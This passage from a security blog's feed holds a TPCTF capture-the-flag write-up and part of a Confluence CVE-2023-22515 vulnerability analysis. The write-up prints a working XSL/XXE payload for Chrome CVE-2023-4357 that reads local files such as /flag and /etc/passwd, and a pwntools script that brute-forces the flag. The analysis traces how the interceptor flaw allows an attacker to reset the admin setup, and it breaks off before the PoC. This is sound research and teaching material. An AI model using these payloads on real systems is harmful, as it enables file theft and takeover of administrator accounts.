hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CVE" scheme="https://drun1baby.github.io/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://drun1baby.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>2023 TPCTF WP</title>
    <link href="https://drun1baby.github.io/2023/11/28/2023-TPCTF-WP/"/>
    <id>https://drun1baby.github.io/2023/11/28/2023-TPCTF-WP/</id>
    <published>2023-11-28T07:36:15.000Z</published>
    <updated>2023-11-30T01:13:08.547Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Nepnep yyds！</li></ul><h1 id="2023-TPCTF-WP"><a href="#2023-TPCTF-WP" class="headerlink" title="2023 TPCTF WP"></a>2023 TPCTF WP</h1><h2 id="xssbot-SOLVED-working-晚风"><a href="#xssbot-SOLVED-working-晚风" class="headerlink" title="xssbot | SOLVED | working : 晚风"></a>xssbot | SOLVED | working : 晚风</h2><p>看着像用前几天爆出来的这个CVE-2023-4357来任意文件读取，本地复现ing…done!</p><p>payload</p><img src="/2023/11/28/2023-TPCTF-WP/web1.png" class><p>魔改自：<a class="link" href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/28/2023-TPCTF-WP/xxe.png" class><h2 id="Xssbot-but-no-Internet-SOLVED-working-LemonPrefect，晚风"><a href="#Xssbot-but-no-Internet-SOLVED-working-LemonPrefect，晚风" class="headerlink" title="Xssbot but no Internet | SOLVED | working : LemonPrefect，晚风"></a>Xssbot but no Internet | SOLVED | working : LemonPrefect，晚风</h2><p>BOT 接受一个文件并使用 Chrome 无头浏览器进行访问，根据 Dockerfile 可知其 flag 位于 <code>/flag</code>。因此使用最近释出的针对 &lt;116.0.5845.96 版本 Chrome 的 libxslt 任意文件包含漏洞处理。</p><p>默认情况下，Chrome 对跨域做了严格的限制，但针对于 XSL 样式表中利用 <code>document()</code> 包含的外部文件没有做严格限定。因此可以利用这部分进行文件包含。</p><blockquote><p><a class="link" href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE<i class="fas fa-external-link-alt"></i></a></p></blockquote><p>由于靶机并不能出网，所以无法直接发起请求外带出文件。分析 BOT 的代码发现其在 <code>driver.get</code> 方法中访问上传的文件并 catch 了所有错误。因此尝试使 <code>get</code> 方法产生异常。</p><p>此处使用一个超长的 url 重定向使 Chrome 崩溃从而产生一个 <code>selenium.common.exceptions.TimeoutException</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;?#&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">div</span> [</span></span><br><span class="line"><span class="meta">  &lt;!-- <span class="meta">&lt;!ENTITY <span class="keyword">passwd_p</span>        <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">passwd_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta">  &lt;!-- <span class="meta">&lt;!ENTITY <span class="keyword">sysini_p</span>        <span class="string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">sysini_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;p class=&quot;&amp;passwd_p;&quot;&gt;&amp;passwd_c;&lt;/p&gt; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>&amp;sysini_c;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:40rem&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#r&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">remote web url:    &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;<span class="subst">$&#123;location.href&#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> text = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            flag = p.<span class="property">innerText</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(flag.<span class="title function_">startsWith</span>(<span class="string">&quot;LEMON_HIT_FLAG&quot;</span>))&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> total = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &amp;lt; <span class="number">10000000000000</span>; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">                    total += i.<span class="title function_">toString</span>();</span></span><br><span class="line"><span class="language-javascript">                    history.<span class="title function_">pushState</span>(<span class="number">0</span>, <span class="number">0</span>, total);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#r&#x27;</span>).<span class="property">innerHTML</span> += <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">local file path:   &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;<span class="subst">$&#123; p.className &#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">local file content:&amp;lt;textarea style=&quot;width:100%;height:6rem&quot;&gt;<span class="subst">$&#123; p.innerHTML &#125;</span>&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EXP</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sem = threading.Semaphore(<span class="number">6</span>)</span><br><span class="line">now = <span class="string">&quot;TPCTF&#123;&quot;</span></span><br><span class="line">should_be_next = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params"><span class="built_in">slice</span>: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">global</span> now</span><br><span class="line">    <span class="keyword">global</span> should_be_next</span><br><span class="line">    now = <span class="built_in">slice</span></span><br><span class="line">    should_be_next = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">attempt: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">global</span> now</span><br><span class="line">    <span class="keyword">global</span> should_be_next</span><br><span class="line">    sem.acquire()</span><br><span class="line">    <span class="keyword">if</span> should_be_next:</span><br><span class="line">        sem.release()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    proc = remote(<span class="string">&quot;202.112.238.82&quot;</span>, <span class="string">&quot;23379&quot;</span>)</span><br><span class="line">    proc.sendlineafter(<span class="string">b&quot;File name:&quot;</span>, <span class="string">b&quot;lemon.svg&quot;</span>)</span><br><span class="line">    proc.sendafter(<span class="string">b&quot;Input your file:&quot;</span>, <span class="built_in">open</span>(</span><br><span class="line">        <span class="string">&quot;./test.svg&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().replace(<span class="string">b&quot;LEMON_HIT_FLAG&quot;</span>, attempt.encode()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Trying <span class="subst">&#123;attempt&#125;</span>&quot;</span>)</span><br><span class="line">    proc.sendline(<span class="string">b&quot;EOF&quot;</span>)</span><br><span class="line">    proc.recvuntil(<span class="string">b&quot;Now browsing your website...\n&quot;</span>)</span><br><span class="line">    message = proc.recvline().decode().strip()</span><br><span class="line">    proc.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Message: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> message:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Tried `<span class="subst">&#123;attempt&#125;</span>&#x27; success as <span class="subst">&#123;message&#125;</span>.&quot;</span>)</span><br><span class="line">        push(attempt)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;Bye&quot;</span> <span class="keyword">in</span> message:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[x] Tried `<span class="subst">&#123;attempt&#125;</span>&#x27; failed as <span class="subst">&#123;message&#125;</span>.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">    sem.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    alphabets = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> now.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        threads = []</span><br><span class="line">        should_be_next = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> alphabet <span class="keyword">in</span> alphabets:</span><br><span class="line">            attempt = now + alphabet</span><br><span class="line">            t = threading.Thread(target=task, args=(attempt,))</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="built_in">print</span>(now)</span><br></pre></td></tr></table></figure><img src="/2023/11/28/2023-TPCTF-WP/flag2.png" class><h2 id="walk-off-the-earth-SOLVED-working-So1，Drunkbaby，LemonPrefect"><a href="#walk-off-the-earth-SOLVED-working-So1，Drunkbaby，LemonPrefect" class="headerlink" title="walk off the earth | SOLVED| working : So1，Drunkbaby，LemonPrefect"></a>walk off the earth | SOLVED| working : So1，Drunkbaby，LemonPrefect</h2><p>应出题人要求隐去 WP</p><img src="/2023/11/28/2023-TPCTF-WP/flag3.png" class><h2 id="walk-off-the-solar-system-SO1VED-working-Drunkbaby，LemonPrefect"><a href="#walk-off-the-solar-system-SO1VED-working-Drunkbaby，LemonPrefect" class="headerlink" title="walk off the solar system | SO1VED | working : Drunkbaby，LemonPrefect"></a>walk off the solar system | SO1VED | working : Drunkbaby，LemonPrefect</h2><p>请参照 walk off the earth，所用方法和脚本都一致，在此不再赘述。</p><img src="/2023/11/28/2023-TPCTF-WP/flag4.png" class>]]></content>
    
    
    <summary type="html">2023 TPCTF WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-22515 Confluence RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-27T01:48:04.000Z</published>
    <updated>2023-11-27T01:54:30.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-22515-Confluence-RCE-漏洞分析"><a href="#CVE-2023-22515-Confluence-RCE-漏洞分析" class="headerlink" title="CVE-2023-22515 Confluence RCE 漏洞分析"></a>CVE-2023-22515 Confluence RCE 漏洞分析</h1><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Confluence 是由 Atlassian 开发的企业级协作软件。2023年10月，Atlassian 官方披露 CVE-2023-22515 Atlassian Confluence Data Center &amp; Server 权限提升漏洞。攻击者可构造恶意请求创建管理员，从而登录系统，造成敏感信息泄漏等。</p><p>如果 Confluence 站点托管在 Atlassian Cloud(域名为：<code>atlassian.net</code>)，则不受此漏洞影响。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>8.0.0 - - 8.0.4<br>8.1.0 - - 8.1.4<br>8.2.0 - - 8.2.3<br>8.3.0 - - 8.3.2<br>8.4.0 - - 8.4.2<br>8.5.0 - - 8.5.1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>安装包 <a class="link" href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives<i class="fas fa-external-link-alt"></i></a></p><p>jar 包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.1.zip  </span><br><span class="line">https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.2.zip</span><br></pre></td></tr></table></figure><p>大致的安装可以看 <a class="link" href="https://cn-sec.com/archives/2177640.html">https://cn-sec.com/archives/2177640.html<i class="fas fa-external-link-alt"></i></a></p><p>其中有一步数据库的安装会存在一些问题，首先是新建数据库的时候，对编码有要求</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE confluence <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_bin;</span><br></pre></td></tr></table></figure><p>随后是连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://localhost/confluence?sessionVariables=transaction_isolation=<span class="string">&#x27;READ-COMMITTED&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setupDatabase.png" class><p>在配置数据库时需要指定 <code>READ-COMMITTED</code></p><p>下一步是做调试准备，这里的调试需要找到 Service</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/service.png" class><p>随后在 cmd 里面运行这一个行命令，就会跳出如图所示的框框</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat9w.exe //ES//Confluence151123100612</span><br></pre></td></tr></table></figure><p>随后添加 JAVA_OPTS，进行动调</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据官方的公告，修复建议是给 <code>/setup</code> 打头的接口做鉴权校验</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/setup/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method-omission</span>&gt;</span>*<span class="tag">&lt;/<span class="name">http-method-omission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">auth-constraint</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于 Confluence 这里的框架是基于 S2 的，S2 的大致流程如 su18 师傅的图所示</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/s2Route.png" class><p>也就是说我们现在需要去找一下 <code>/setup/*</code> 接口是怎么被处理的，直接分析是比较难的，所以先 diff 一下代码。</p><ul><li><p>首先 <code>struts2.xml</code> 里面</p></li><li><p>修复版本新增了 <code>struts.override.acceptedPatterns</code></p></li><li><p>修复版本删除了 <code>server-info action</code></p></li></ul><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/strutsXMLDiff.png" class><ul><li>接着是 <code>BootstapStatusProviderImpl</code> 类里面增加了部分内容，对属性 setupPersister 和 applicationConfig 做了限制</li></ul><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/BootstapStatusProviderImpl.png" class><p>这里有点没看懂修了什么，所以我先动调观察具体接口是怎么处理的，根据 Struts2 的特性，去到 <code>struts.xml</code> 里面找对应的 <strong>Interceptor</strong>，不难找到具体处理的拦截器是 <code>SetupCheckInterceptor</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setupInterceptor.png" class><p>开始动调，看一下 <code>/setup/setupadministrator.action</code> 接口的逻辑是怎么处理的。</p><p>中间走到 <code>com.atlassian.config.ApplicationConfig#isSetupComplete</code> 时，在新版本的 fix 里面是增加了这一段的 <code>ReadOnlyApplicationConfig</code> 配置的</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/isSetupComplete.png" class><p>所以这里的漏洞利用思路大概就是先动态修改 <code>setupPersister</code> 或 <code>applicationConfig</code>，在触发了这一点之后，能够下一步访问 <code>/setup/setupadministrator.action</code>，重新配置管理员密码。</p><p>这里具体的实现很有意思，su18 师傅的文章说的很明白，我就直接拿过来用了</p><p><a class="link" href="https://su18.org/post/struts2-1/">https://su18.org/post/struts2-1/<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>OGNL 中的根对象即为 ValueStack（值栈），这个对象贯穿整个 Action 的生命周期（每个 Action 类的对象实例会拥有一个 ValueStack 对象）。当Struts 2接收到一个 <code>.action</code> 的请求后，会先建立Action 类的对象实例，但并不会调用 Action 方法，而是先将 Action 类的相应属性放到 ValueStack 的实现类 OgnlValueStack 对象 root 对象的顶层节点（ ValueStack 对象相当于一个栈）。在处理完上述工作后，Struts2 就会调用拦截器链中的拦截器，这些拦截器会根据用户请求参数值去更新 ValueStack 对象顶层节点的相应属性的值，最后会传到 Action 对象，并将 ValueStack 对象中的属性值，赋给 Action 类的相应属性。当调用完所有的拦截器后，才会调用 Action 类的 Action 方法。ValueStack 会在请求开始时被创建，请求结束时消亡。</p></blockquote><p>我们需要找一个 OGNL 的点, 并且这个点能够以某种方式去调用某个类的 getter &#x2F; setter, 以此来配置 applicationConfig 的 setupComplete 字段</p><p>于是去 diff 跟 Struts2 有关的依赖, 即 <code>com.atlassian.struts2_struts-support-1.1.0.jar</code> 和 <code>com.atlassian.struts2_struts-support-1.2.0.jar</code></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff2.png" class><p>发现修改的类是 <code>SafeParametersInterceptor</code>，这个类会处理所有的输入，所以 <code>server-info.action</code> 这个请求也会经过它</p><p>同时，Confluence 使用了 XWork 框架，它允许通过 HTTP 请求来设置 Java 对象的参数：<a class="link" href="https://developer.atlassian.com/server/confluence/xwork-plugin-complex-parameters-and-security/">XWork Plugin Complex Parameters and Security<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>XWork allows the setting of complex parameters on an XWork action object. For example, a URL parameter of <code>formData.name=Charles</code> will be translated by XWork into the method calls <code>getFormData().setName(&quot;Charles&quot;)</code> by the XWork parameters interceptor. If <code>getFormData()</code> returns null, XWork will attempt to create a new object of the appropriate return type using its default constructor, and then set it with <code>setFormData(newObject)</code></p></blockquote><p>这就允许我们在输入时候传参类似于 <code>?test=a.b.c</code>，动调一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.80.137:8090/server-info.action?a.b.c</span><br></pre></td></tr></table></figure><p>这里会先做过滤，跟进 <code>this.filterSafeParameters()</code> 方法，该方法会对传入的参数进行判断，如果包含关键字或者满足正则匹配则返回 false</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/filterSafeParameters.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BLOCKED_PARAMETER_NAMES: actionErrors、actionMessages  </span><br><span class="line">EXCLUDE_CLASS_PATTERN: .*class[^a-z0-9_].*  </span><br><span class="line">SAFE_PARAMETER_NAME_PATTERN: \w+((\.\w+)|(\[\d+\])|(\[<span class="string">&#x27;[\w.]*&#x27;</span>\]))*  </span><br><span class="line">MAP_PARAMETER_PATTERN: .*\[<span class="string">&#x27;[a-zA-Z0-9_]+&#x27;</span>\]</span><br></pre></td></tr></table></figure><p>如果不在黑名单内，最后会调用 <code>isSafeComplexParameterName()</code> 方法，这个方法会检查传入的参数是否调用了当前 action 的某个 getter &#x2F; setter，如果调用了，则判断里面是否有 <code>ParameterSafe</code> 注解。</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/isSafeComplexParameterName.png" class><p>如果没有实现 <code>@ParameterSafe</code> 注解，那么 isSafeMethod 就会返回 false</p><p>这么一看，漏洞成立需要绕过黑名单验证，并且满足 <code>@ParameterSafe</code> 注解，利用条件十分苛刻。继续往下走，回到 <code>com.atlassian.xwork.interceptors.SafeParametersInterceptor#doIntercept</code>，跟进 <code>super.doIntercept()</code> 方法。能够看到这里是跟进到了 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept</code> 方法，它会重新处理一遍参数，这就导致上面的黑名单完全没生效。</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/doIntercept.png" class><p>跟进 <code>setParameters()</code> 方法后其实就是 S2 处理 OGNL 语句的那一套，参考 <a class="link" href="https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setParameter.png" class><p>总的来说, 因为 <code>SafeParametersInterceptor.doIntercept()</code> 方法的一些逻辑问题, 导致这个类自身对传入参数的过滤并没有生效, 我们最终还是可以通过 <code>a.b.c=e</code> 的形式去调用当前 action 的 getter &#x2F; setter, 并不需要关心方法本身或者它的 returnType 是否使用了 <code>@ParameterSafe</code> 注解</p><p>到这里思路就很清晰了，我们只需要构造 OGNL 即可，调用某个 Action 里的 setter，让 <code>isSetupComplete=false</code> 即可</p><p>以 ServerInfoAction 为例, 它继承自 ConfluenceActionSupport</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getBootstrapStatusProvider.png" class><p>这里的 <code>getBootstrapStatusProvider()</code> 方法调用了 <code>BootstrapStatusProviderImpl.getInstance()</code>，接下来就可以去 <code>BootstrapStatusProviderImpl</code> 里面寻找调用链，可惜的是这里的 <code>setSetupComplete()</code> 已经用不了了，只能找另外的</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setSetupComplete.png" class><p>最终找到的是 <code>getApplicationConfig()</code> 方法，而在 <code>ApplicationConfig</code> 类里面存在 <code>setSetupComplete()</code> 方法可用</p><img src="/2023/11/27/CVE-2023-22515-Confluence-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/setSetupCompleteEnd.png" class><p>因为 Confluence 的所有 Action 都继承自 ConfluenceActionSupport, 所以理论上只要访问任意一个使用了 SafeParameterInterceptor 的路由, 无论是 GET 还是 POST 方法都能够利用成功</p><p>于是最后的 PoC 应该是</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span 